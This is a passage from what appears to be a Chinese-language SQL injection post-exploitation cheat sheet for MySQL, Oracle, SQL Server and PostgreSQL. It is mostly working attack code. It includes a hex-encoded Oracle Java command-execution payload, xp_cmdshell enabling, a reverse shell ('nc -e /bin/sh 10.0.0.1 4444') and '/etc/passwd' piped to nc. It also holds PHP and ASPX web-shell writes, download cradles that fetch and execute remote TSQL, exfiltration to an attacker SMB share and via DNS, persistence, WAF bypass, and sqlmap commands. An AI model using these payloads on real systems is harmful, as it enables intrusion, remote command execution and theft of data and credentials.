      BufferedReader myReader = new BufferedReader(new FileReader(filename));
      String stemp, str = "";
      while((stemp = myReader.readLine()) != null) 
        str += stemp + "\n";
      myReader.close();
      return str;
    } 
    catch (Exception e){ 
      return e.toString();
    }
  }
}
```

##### 生成java 类（Hex 编码）

```sql
/* create Java class */
SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```
#### mssqlserver
- xp_cmdshell	

```
-- Enable show advanced options
sp_configure 'show advanced options', 1
RECONFIGURE
GO

-- Enable xp_cmdshell
sp_configure 'xp_cmdshell', 1
RECONFIGURE
GO

EXEC xp_cmdshell 'net user'
```

- Write to registry autorun	https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/
https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e

- Write to file autorun	https://blog.netspi.com/how-to-hack-database-links-in-sql-server/

- Agent Jobs	https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution

- SQL Injection in stored procedures	https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/

- CLR Assembly	https://blog.netspi.com/attacking-sql-server-clr-assemblies/

- Custom Extended Stored Procedure	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp

##### TSQL

- ActiveX Javascript Agent Job	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql
- ActiveX VBScript Agent Job	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql
- cmdexec Agent Job	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql
- Powershell Agent Job	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql
- Custom Command Shell	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp
- OLE Automation Object	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql
- OPENROWSET	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql
- Python	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql
- R	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql
- xp_cmdshell proxy	https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql


#### POSTGRESQL
- FROM PROGRAM	
```
DROP TABLE IF EXISTS myoutput;
CREATE TABLE myoutput(filename text);
COPY myoutput FROM PROGRAM 'ps aux';
SELECT * FROM myoutput ORDER BY filename ASC;
```

- Create PostgreSQL Function Mapped  
to Libc System Method	
```
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc ');

Notes:
This method works with PostgreSQL 8.1 and below. After version 9, you'll have to upload your own library with the "PG_MODULE_MAGIC" set.
The process for this is outlined at https://www.dionach.com/blog/postgresql-9x-remote-command-execution, below is a summary.

1. To get the version from the PostgreSQL server use the query below.

SELECT version();

2. To compile the library, a Linux machine with the same version of PostgreSQL as the target machine is required. Below is an example showing how to install PostgreSQL.

apt install postgresql postgresql-server-dev-9.6

3. Download pgexec file from https://github.com/Dionach/pgexec/tree/master.

4. Compile pgexec with the command below.

gcc -I$(/usr/local/pgsql/bin/pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c

5. Upload the library to the target system. First split the file into pieces.

split -b 2048 pg_exec.so

6. The file can then be written to disk through PostgreSQL using the commands below.

SELECT lo_creat(-1);
set c0 `base64 -w 0 xaa`
INSERT INTO pg_largeobject (loid, pageno, data) values (16388, 0, decode(:'c0', 'base64'));

Then repeat for each piece of the file.

7. Create the function.

CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;

8. Send a reverse shell to your system.

SELECT sys('nc -e /bin/sh 10.0.0.1 4444');

Source: https://www.dionach.com/blog/postgresql-9x-remote-command-execution

```

- Metasploit postgres_payload Module
This can be used with direct connections.	

```
https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload
exploit/linux/postgres/postgres_payload
```
### 读取或写入文件
读写文件可收集数据gathering or exfiltration。

* Requires privileged user

#### mysql
- Dump to file
`select * from mytable INTO dumpfile '/tmp/somefile'

- Dump PHP SHELL
`SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'`

- Read File	
`SELECT LOAD_FILE('/etc/passwd')`

- Read File Obfuscated	
`SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
reads c:\boot.ini`

- File Privileges	
`SELECT file_priv FROM mysql.user WHERE user = 'netspi'`

`SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%netspi%'`

#### ORACLE
UTL_FILE can sometimes be used. Check that the following is non-null:

`SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir';`

Java can be used to read and write files if it's installed (it is not available in Oracle Express).
#### SQLSERVER
- Download Cradle bulk in server - TSQL

```
-- Bulk Insert - Download Cradle Example

-- Setup variables
Declare @cmd varchar(8000)

-- Create temp table
CREATE TABLE #file (content nvarchar(4000));

-- Read file into temp table - web server must support propfind
BULK INSERT #file FROM '\\sharepoint.acme.com@SSL\Path\to\file.txt';

-- Select contents of file
SELECT @cmd = content FROM #file

-- Display command
SELECT @cmd

-- Run command
EXECUTE(@cmd)

-- Drop the temp table
DROP TABLE #file
```
- 下载 Cradle OAP 1 - TSQL

```
-- OLE Automation Procedure - Download Cradle Example
-- Does not require a table, but can't handle larger payloads

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.

-- Setup Variables
DECLARE @url varchar(300)
DECLARE @WinHTTP int
DECLARE @handle int
DECLARE @Command varchar(8000)

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Setup namespace
EXEC @handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT

-- Call the Open method to setup the HTTP request
EXEC @handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'

-- Call the Send method to send the HTTP GET request
EXEC @handle=sp_OAMethod @WinHTTP,'Send'

-- Capture the HTTP response content
EXEC @handle=sp_OAGetProperty @WinHTTP,'ResponseText', @Command out

-- Destroy the object
EXEC @handle=sp_OADestroy @WinHTTP

-- Display command
SELECT @Command

-- Run command
EXECUTE (@Command)
```

- 下载 Cradle OAP 2 - TSQL
```
-- OLE Automation Procedure - Download Cradle Example - Option 2
-- Can handle larger payloads, but requires a table

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.

-- Setup Variables
DECLARE @url varchar(300)
DECLARE @WinHTTP int
DECLARE @Handle int
DECLARE @Command varchar(8000)

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Create temp table to store downloaded string
CREATE TABLE #text(html text NULL)

-- Setup namespace
EXEC @Handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT

-- Call open method to configure HTTP request
EXEC @Handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'

-- Call Send method to send the HTTP request
EXEC @Handle=sp_OAMethod @WinHTTP,'Send'

-- Capture the HTTP response content
INSERT #text(html)
EXEC @Handle=sp_OAGetProperty @WinHTTP,'ResponseText'

-- Destroy the object
EXEC @Handle=sp_OADestroy @WinHTTP

-- Display the commad
SELECT @Command = html from #text
SELECT @Command

-- Run the command
EXECUTE (@Command)

-- Remove temp table
DROP TABLE #text
```

- 读文件-TSQL
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql

- Writing Files - TSQL	
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql
https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql

#### postgresql

- Read Files from Operating System - COPY	
```
CREATE TABLE mydata(t text);
COPY mydata FROM '/etc/passwd';
SELECT * FROM mydata;
DROP TABLE mytest mytest;
```

- Read Files from Operating System - pg_read_file	
```
SELECT pg_read_file('/usr/local/pgsql/data/pg_hba.conf', 0, 200);
```

- Writing Files from Operating System	
```
CREATE TABLE mytable (mycol text);
INSERT INTO mytable(mycol) VALUES ('');
COPY mytable (mycol) TO '/var/www/test.php';
```


### 横向移动

#### mysql

- Create Users	
`CREATE USER 'netspi'@'%' IDENTIFIED BY 'password'`

- Drop User	
`DROP USER netspi`
#### oracle

- create users
`CREATE USER user IDENTIFIED by pass;`

- 删除users
`DROP USER user`

#### sqlserver
- Create Users	
`EXEC sp_addlogin 'user', 'pass';`

- Drop Users	
`EXEC sp_droplogin 'user';`

- Link crawling	 https://blog.netspi.com/sql-server-link-crawling-powerupsql/
  
- Connect to remote database as current service	
```
--Requires sysadmin
SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=MSSQLSRV04\SQLSERVER2016;Trusted_Connection=yes;').master.dbo.sysdatabases
```


### 数据获取（data exfiltration）
Exfiltrating data allows easier data analysis, as well as an offline copy of any compromised data. Data can be exfiltrated through files, various Layer 4 requests, and hidden techniques.

#### mysql
- DNS Request	
`SELECT LOAD_FILE(concat('\\\\',(QUERY_WITH_ONLY_ONE_ROW), '.yourhost.com\\'))`

- SMB Share	
`SELECT * FROM USERS INTO OUTFILE '\\attacker\SMBshare\output.txt'`

- HTTP Server
`SELECT * FROM USERS INTO OUTFILE '/var/www/html/output.txt'`

- Numeric Concatenation	

`SELECT length(user())`
`SELECT ASCII(substr(user(),1))`

When data can only be exported as numbers, convert to ASCII. For automation see [here](http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1).

#### oracle
- Combine multiple lines into one	

`SELECT dbms_xmlgen.getxmltype('select user from dual') FROM dual`

- XML External Entity	

`SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test"> %remote; %param1;]>') FROM dual;`

- URL_HTTP Request (Pre-11gR2)	
`SELECT UTL_HTTP.request ('http://IP/test') FROM dual;`

- Escaping special characters	

`SELECT UTL_URL.escape('http://IP/' || USER) FROM dual;`

#### mssqlserver

Note: It is possible to make a DNS request from MSSQL. However, this request requires administrator privileges and SQL Server 2005.

- Make DNS Request	
```
DECLARE @host varchar(800);
select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.netspi.com' from sys.sql_logins;

exec('xp_fileexist "\' + @host + 'c$boot.ini"');
```

- UNC Path (DNS Request)	

```
xp_dirtree '\\data.domain.com\file'
```
The UNC Path Injection Cheatsheet can be found here.


- Enable sp_send_dbmail and send query	
```
sp_configure 'show advanced options', 1;RECONFIGURE;sp_configure 'Database Mail XPs', 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients='harold@netspi.com',@query='select @@version';
```

- Basic xp_sendmail Query	
```
EXEC master..xp_sendmail 'harold@netspi.com', 'This is a test.'
```

- Send Full Email with xp_sendmail	
```
EXEC xp_sendmail @recipients='harold@netspi.com',
@message='This is a test.',
@copy_recipients='test@netspi.com',
@subject='TEST'
```

- Send Query Results Via xp_sendmail	
```
EXEC xp_sendmail 'harold@netspi.com', @query='SELECT @@version';
```
- Send Query Results as Attachment Via xp_sendmail	
```
CREATE TABLE ##texttab (c1 text)
INSERT ##texttab values ('Put messge here.')
DECLARE @cmd varchar(56)
SET @cmd = 'SELECT c1 from ##texttab'
EXEC master.dbo.xp_sendmail 'robertk',
@query = @cmd, @no_header='TRUE'
DROP TABLE ##texttab
```
### 持久化
Gaining persistence on a system creates a semi-permanent foothold in the network, allowing prolonged exploitation time. With this extra time different vectors and exploit methods can be attempted.
#### mssqlserver

- Startup stored procedures	https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/

- Triggers	https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/

- Regwrite	https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/

## 自定义函数 UDF

不少数据库都支持从本地文件系统中导入一个共享文件作为自定义函数。自定义函数可能调用系统命令，完成系统渗透。

例如：mysql 4.x 的UDF的语法如下：

`CREATE FUNCTION foo_name RETURNS INTEGER SONAME shared_library`

在 mysql 5.x后，上述定义不再适用。但可通过 lib_mysqludf_sys 提供的几个函数执行系统命令，最主要的是：
- `sys_eval()` 执行任意系统命令，返回输出
- `sys_exec()` 执行任意命令，将退出码返回
- `sys_get()` 获取一个环境变量
- `sys_set()` 设置一个环境变量

将 lib_mysqludf_sys 上传到数据库能访问的路径下，创建UDF后就可以使用上述命令了。

sqlmap已经集成了这一功能，例如sqlmap执行linux命令`id`：
`python sqlmap.py -u "http://target-ip/injectable_path?id=1" --os-cmd id -v 1`

UDF不仅是MYSQL的特性，其他数据库也有类似功能：
- ms sql server，可以直接使用存储过程`xp_cmdshell`执行系统命令
- oracle 中，如果服务器有java环境，那么也可能造成命令执行，即注入后可多语句执行的情况下，可以在oracle中创建java的存储过程，执行系统命令。

## 曾经出现过的 sql column truncation
基本思路是插入过长的数值时，可能会被截断，例如插入users表用户名`admin    很长的空格     x`，一些数据库产品会截断这个输入，并且插入执行成功。这样数据库中可能就存在2个admin了。


## 攻击存储过程
仅当存储过程不能生成动态sql时，才可以使用存储过程避免注入问题。


### 存储过程
在ms sql server 和oracle中有大量内置的存储过程，他们与UDF很像，但必须使用 `CALL` 或 `EXECUTE` 执行。

#### ms sql server

#####  xp_cmdshell
微软的sql server 中，存储过程 `xp_cmdshell`可谓是臭名昭著，黑客教程总会讲到注入sql server时使用其执行系统命令：
- `EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:\'`
- `EXEC master.dbo.xp_cmdshell 'ping'`

存储过程 `xp_cmdshell` 在sqlserver 2000默认开启，在 2005后被默认关闭了。但sqlserver2005\2008中, 如果当前数据库用户有 sysadmin 权限，则可以使用 `sp_configure` 重新开启它。如果在sqlserver 2000被关闭，则可以使用sp_addextendproc开启它。

例如：
```
EXEC sp_configure 'show advanced options' , 1
RECONFIGURE

EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

##### 其他可用的存储过程
- `xp_regread` 操作注册表
- xp_regaddmultistring
- xp_regdeletekey
- xp_regdeletekey
- xp_regenumkeys
- xp_regenumvalues
- xp_regread
- xp_regremovemultistring
- xp_regwrite
- xp_servicecontrol ,允许用户启动，停止服务
- xp_availablemedia，显示机器上有用的驱动器
- xp_dirtree，允许获得一个目录树
- xp_enumdsn，列举服务器上的odbc数据源
- xp_loginconfig，获取服务器安全信息
- xp_makecab，允许用户在服务器上创建一个压缩文件
- xp_ntsec_enumdomains，列举服务器可以进入的域
- xp_terminate_process，提供进程id，终止此进程

例如:
```
EXEC xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters','nullsessionshares'

EXEC xp_regnumvalues HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'

EXEC master..xp_serviccontrol 'start' , 'schedule'
```
##### 存储过程本身的注入漏洞

可注入的存储过程举例(Microsoft SQL Server):
```sql
CREATE PROEDURE getUser(@lastName nvarchar(25))
AS
declare @sql nvarchar(255)
set @sql = 'select * from users where
            LastName = + @LastName + '
exec sp_executesql @sql
```
上面的@sql是一个动态的sql语句，可以被替换为注入内容。

安全的存储过程例如(Microsoft SQL Server)：
```sql
CREATE PROCEDURE ListCustomers(@Country nvarchar(30))
AS
SELECT City, COUNT(*)
FROM Customers
WHERE Country LIKE @Country GROUP BY City

EXEC ListCustomers ‘USA’
```



## 绕过WAF

在这里，需要清楚WAF拦截的是payload的哪一部分。

### 采取分段测试的方法确定拦截策略

例如：假设无法执行```select user()``` ，我们需要判断WAF匹配规则，是命中了```select```，还是```user()```，或是使用了 ```/select.*?user/```这个正则。

- 尝试1：```selact user()```，测试是否拦截 select
- 尝试2：```select usar()```，测试是否拦截 user

若上述两个测试都为拦截，则说明使用了 ```/select.*?user/```这个正则匹配，那么我们修改语句即可。

### 使用数据库特性和中间件解析特性绕过内敛注释符

作者：二向箔安全学院
链接：https://www.zhihu.com/question/404381236/answer/1318383402
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

MySQL Server支持C样式注释的某些变体。这些使您能够通过使用以下形式的注释来编写包括MySQL扩展但仍可移植的代码：
/*! MySQL-specific code */
在这种情况下，MySQL服务器将像其他任何SQL语句一样解析并执行注释中的代码，但是其他SQL Server将忽略这些扩展。例如，MySQL服务器可以STRAIGHT_JOIN在以下语句中识别关键字，而其他服务器则不能：
SELECT /*! STRAIGHT_JOIN */ col1 FROM table1,table2 WHERE ...
如果在! 字符后添加版本号，则仅当MySQL版本大于或等于指定的版本号时，才会执行注释中的语法。KEY_BLOCK_SIZE以下注释中的关键字仅由MySQL 5.1.10或更高版本的服务器执行：
CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024 */;
刚刚描述的注释语法适用于mysqld服务器如何 解析SQL语句。在 MySQL的客户端程序将它们发送到服务器之前还执行语句的一些分析。（这样做是为了确定多语句输入行中的语句边界。）有关服务器和mysql客户端解析器之间差异的信息 ，请参见 第4.5.1.6节“ mysql客户端技巧”。
/*!12345 ... */格式的 注释未存储在服务器上。如果此格式用于注释存储的程序，则注释不会保留在程序主体中。
C样式注释语法的另一种变体用于指定优化器提示。提示注释+ 在/*注释打开顺序之后包含一个字符。例：
SELECT /*+ BKA(t1) */ FROM ... ;


### 参考
https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI


## 快速定位重要的数据表

大型数据库中有上百个表，如何快速定位？

使用sqlmap中的 ```--search```参数，可以用来搜索列、表、数据库名称。

使用方法：
- ```--search -D:数据库名```
- ```--search -T:表名```
- ```--search -C:字段名```

例如搜索字段：username，password等。

## 脱库

一般方式是脱出数据文件，例如：mysql自带的mysqldump就可以用来获取文件。

如果是站库分离的系统，可以上传 mysqldump，指定参数```-h```的主机地址也可以实现数据库文件。

mssql可以获取mdf文件或使用osql命令。

## 注入读写文件

>以下需要事先获得可读写的远程主机路径

当我们注入不能获得进一步内容时，可以考虑读写文件。

读写文件很多情况下都需要用到堆叠语句，MySQL中如果用的是mysqli。并不是所有情况都支持堆叠语句，例如：
- 部分 pdo处理可以堆叠；
- mssql + aspx 是原生堆叠；
- Oracle 是否支持堆叠，依赖于代码层面的实现。


MySQL读文件值得一提的就是load data infile和load data local infile，不受secure-file-priv的限制，但是需要堆叠，或者你也可以找找phpmyadmin，phpmyadmin的话还受到open_basedir限制。通过注入拓展任意文件读取，也算一种思路吧。如果你是mysql低权限账户可以试着读一下user.MYD，万一读到root密码呢？
至于load data local infile的权限问题一直是一个谜，我理解的他的权限应该是和MySQL的权限一样的，因为碰到了一次读不到apache用户www目录下的源码，MySQL用户和apache权限不一样。但是其实我自己都不是很确定，希望有师傅看到了指点一下。
MySQL写文件的话into outfile、into dumpfile还有就是日志写文件general log，绝对路径写shell，插件写udf，写mof。
mssql的话读写文件的操作更多样化一些。

列目录```xp_dirtree```、```xp_subdirs```

写文件```xp_cmdshell 'echo 1 > c:/1.txt'```、```sp_oacreate```、```sp_oamethod``` 配合写shell

```
declare @sp_passwordxieo int, @f int, @t int, @ret int;
exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out;
exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'c:/www/1.aspx', 1;
exec @ret = sp_oamethod @f, 'writeline', NULL,'this is shell';
```

或者出网的话直接写一个vbs下载器，随意发挥。

读文件的话
```
USE test;
DROP TABLE cmd;
CREATE TABLE cmd ( a text );
BULK INSERT cmd FROM 'd:/config.aspx' WITH (FIELDTERMINATOR = 'n',ROWTERMINATOR = 'nn')
SELECT  * FROM  cmd
```

站库分离的话看下数据库服务器有没有web服务，如果直接访问IP是iis默认页面可以直接往iis的默认目录写aspx。没有web服务的话可以写一个dns的马进去，xp_cmdshell执行，或者调用wscript.shell执行。

postgresql的copy from，copy to读写文件，要是有别人的马直接读文件岂不是美滋滋。

## 执行命令

MySQL udf mof不说了
mssql xp_cmdshell、自己创建clr、调用wscript.shell、调用Shell.Application、写启动项、写dll劫持。
之前碰到过一个站库分离，有xp_cmdshell，但是只出dns的。通过certutil转exe为base64，通过echo写入文件，调用目标的certutil转回exe执行上线。

##    其他利用场景
任意文件上传，没有路径，找找注入在数据库中肯定存储了文件的路径，配合sqlmap的--sql-shell和--search参数就能找到shell地址。



## 参考：
- https://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&mid=2657039441&idx=2&sn=6c7943ba7d78b05557ef03b5875ed1ec&chksm=803fd48fb7485d99d19b3945d9142c35aeb8344e156984c8dfc048a93793dd08e0c5473b795e&mpshare=1&scene=24&srcid=10234Y11mGORCKoTcjBRm3tl&sharer_sharetime=1603450492711&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=AUwX7JFVpmgH2m9uJC%2FVNrw%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd
- https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649733472&idx=1&sn=80a329001a5a121a39a574b9be6b38b9&chksm=888c890fbffb0019a72cdfb85c5530381584069f09a17aedc677882441b784cc1c4b4443dedd&mpshare=1&scene=24&srcid=1023fVE1sphfNxZcBuieFmdH&sharer_sharetime=1603447869255&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=Adrfgb9TOQsqv3gkdAmJgWc%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd

- https://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&mid=2657039246&idx=2&sn=148c9c465263ad54b3b422387de2e49a&chksm=803fd350b7485a46ba70d7b1bafcb41aa481a5021ed173d003f4602b8e6e15dd1fd31a2e1328&mpshare=1&scene=24&srcid=0823whOFHmPKZ1XXZtdBiI0S&sharer_sharetime=1598195216665&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=AW7osLi7uj1oQBstdrRrOdg%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd

- https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247487719&idx=1&sn=7fac52127b489989c67f9b0b5d9d1824&chksm=9acec078adb9496e33675e1d7b673855a280d6c59c9fee915452ad27ad6f9c56e076fa60df9a&mpshare=1&scene=24&srcid=0810R1EssvjvmoM6q13lR46w&sharer_sharetime=1597026200547&sharer_shareid=9530e1864f9ccae4832cd88b98041964&exportkey=AbD7Wr1WHoqi2jijk53XIMU%3D&pass_ticket=nQcihpZIrgq%2F0dgwRHBaNkcP2TMN7UhBJZ%2BftGUPWoYWtdYy24W%2FTS9YUwwG9Jh%2B&wx_header=0#rd

- https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI


## sqlmap 工具

```
leo@kali:~$ sqlmap --help
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.10.22#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users

```

参数 --technique 用于指定检测注入时所用技术。默认情况下 Sqlmap 会使用自己支持的全部技术进行检测。 此参数后跟表示检测技术的大写字母，其值为 B、E、U、S、T 或 Q，含义如下：

- B：Boolean-based blind（布尔型注入）
- E：Error-based（报错型注入）
- U：Union query-based（可联合查询注入）
- S：Stacked queries（可多语句查询注入）
- T：Time-based blind（基于时间延迟注入）
- Q：Inline queries（嵌套查询注入）


可以用 "--technique ES" 来指定使用两种检测技术。"--technique BEUSTQ" 与默认情况等效。

`$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --technique EB --banner`

用 --time-sec 3 参数设置基于时间延迟注入中延时时长，默认为 5 秒

在进行联合查询注入时，Sqlmap 会自动检测列数，范围是 1 到 10。当 level 值较高时列数检测范 围的上限会扩大到 50。

可以用此参数指定列数检测范围，如 --union-cols 12-16 就会让 Sqlmap 的列数检测范围变成 12 到 16。

默认情况下 Sqlmap 进行联合查询注入时使用空字符（NULL）。但当 level 值较高时 Sqlmap 会生成随机数用于联合查询注入。 因为有时使用空字符注入会失败而使用随机数会成功。但是，注入时过多使用空字符（NULL）会使注入失败率增高。因此可以结合 --union-char 替换null的字符串 参数改善。

`$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/" --union-cols 12-16 --union-char 666 -v 3 --banner`

有些情况下在联合查询中必须指定一个有效和可访问的表名，否则联合查询会执行失败。参数 --union-from 表名

`$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-4/" --union-cols 12-16 --union-char 666 --union-from hello -v 3 --banner`


探测目标指纹信息，参数 -f 或者 --fingerprint，它的效果与 --banner 相似。

`$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-3/?id=1" -f`


## sqlmap的一些payload
假设 Parameter: id (GET)

- Type: boolean-based blind：

`Payload: id=(SELECT (CASE WHEN (8447=8447) THEN 1 ELSE (SELECT 6925 UNION SELECT 4265) END))`

- Type: error-based: 

